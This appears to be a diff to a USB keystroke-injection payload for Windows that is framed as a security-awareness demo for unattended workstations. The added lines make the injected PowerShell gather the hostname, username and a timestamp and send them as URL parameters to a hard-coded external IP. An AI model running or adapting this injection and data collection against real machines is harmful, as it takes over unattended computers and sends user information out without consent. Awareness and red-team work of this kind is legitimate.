@@ -1,11 +1,10 @@
 #!/bin/bash
 #
-# Title:         Unattended Workstation Demo
+# Title:         Unattended Workstation Demo with User Info
 # Author:        Your Name
-# Version:       1.0
+# Version:       1.1
 # Target:        Windows
-# Description:   Opens a browser to a security awareness page to demonstrate
-#                the dangers of leaving workstations unattended
+# Description:   Collects system info and opens security awareness page
 
 # Set the LED to show the payload is running (Yellow)
 LED Y SOLID
@@ -23,8 +22,8 @@ QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 1000
 
-# Start a browser and load the security warning page
-QUACK STRING Start-Process "http://18.132.143.131/Unattended_Workstation/Unattended_WorkStation_Demo2.html"
+# Get system information and construct the URL with parameters
+QUACK STRING $hostname = [System.Net.Dns]::GetHostName(); $username = $env:USERNAME; $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; $url = \"http://18.132.143.131/Unattended_Workstation/Unattended_WorkStation_Demo2.html?hostname=$hostname&username=$username&timestamp=$timestamp\"; Start-Process $url
 QUACK ENTER
 
 # Short delay to let browser open
